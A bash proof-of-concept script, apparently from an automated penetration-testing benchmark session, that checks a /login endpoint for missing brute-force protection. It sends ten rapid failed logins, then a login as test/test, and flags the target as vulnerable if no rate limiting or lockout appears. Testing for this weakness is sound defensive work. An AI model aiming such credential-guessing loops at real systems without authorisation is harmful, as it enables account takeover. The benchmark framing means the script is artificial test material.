#!/bin/bash
# POC: Demonstrates missing brute force protection on login endpoint by performing multiple rapid failed login attempts followed by a successful login, verifying no rate limiting or account lockout is enforced.
# Target: ./repo
# Created: 2025-11-07T16:07:27.228Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# Brute Force Protection Missing - POC
# This script demonstrates that the /login endpoint lacks brute force protection
# by performing rapid failed login attempts followed by a successful login

TARGET_URL="${1:-http://localhost}"
LOGIN_ENDPOINT="/login"
FULL_URL="${TARGET_URL}${LOGIN_ENDPOINT}"

echo "[*] Testing Brute Force Protection on Login Endpoint"
echo "[*] Target: $FULL_URL"
echo ""

# Test 1: Perform 10 rapid failed login attempts
echo "[TEST 1] Performing 10 rapid failed login attempts..."
failed_attempts=0
rate_limited=false

for i in {1..10}; do
    response=$(curl -s -w "\n%{http_code}" -X POST "$FULL_URL" \
        -d "username=test&password=wrong$i" \
        -H "Content-Type: application/x-www-form-urlencoded")
    
    http_code=$(echo "$response" | tail -n1)
    body=$(echo "$response" | head -n-1)
    
    # Check for rate limiting responses
    if [ "$http_code" = "429" ] || [ "$http_code" = "403" ]; then
        echo "  [!] Attempt $i: Rate limited! (HTTP $http_code)"
        rate_limited=true
        break
    elif [ "$http_code" = "401" ] || [ "$http_code" = "200" ]; then
        echo "  [+] Attempt $i: HTTP $http_code (Failed login accepted)"
        ((failed_attempts++))
    else
        echo "  [+] Attempt $i: HTTP $http_code"
    fi
done

echo ""
echo "[RESULT 1] Failed attempts accepted: $failed_attempts/10"
if [ "$rate_limited" = true ]; then
    echo "[!] PROTECTED: Rate limiting detected"
else
    echo "[+] VULNERABLE: No rate limiting detected"
fi

echo ""

# Test 2: Immediately attempt valid login after rapid attempts
echo "[TEST 2] Attempting valid login after rapid failed attempts..."
response=$(curl -s -i -X POST "$FULL_URL" \
    -d "username=test&password=test" \
    -H "Content-Type: application/x-www-form-urlencoded")

http_code=$(echo "$response" | head -n1 | awk '{print $2}')
has_retry_after=$(echo "$response" | grep -i "Retry-After")
has_ratelimit_header=$(echo "$response" | grep -i "X-RateLimit" || echo "$response" | grep -i "RateLimit")

echo "$response" | head -n1
echo "[RESULT 2] Valid login response: HTTP $http_code"

if [ ! -z "$has_retry_after" ]; then
    echo "[!] Retry-After header present (rate limiting)"
elif [ ! -z "$has_ratelimit_header" ]; then
    echo "[!] Rate limit headers present"
else
    echo "[+] No rate limiting headers detected"
fi

echo ""

# Final verdict
if [ "$http_code" = "302" ] || [ "$http_code" = "200" ]; then
    echo "[+] VULNERABLE: Login succeeds immediately after rapid failed attempts"
    echo "[+] No account lockout, rate limiting, or CAPTCHA protection detected"
    exit 0
else
    echo "[!] Login failed or unexpected response"
    exit 1
fi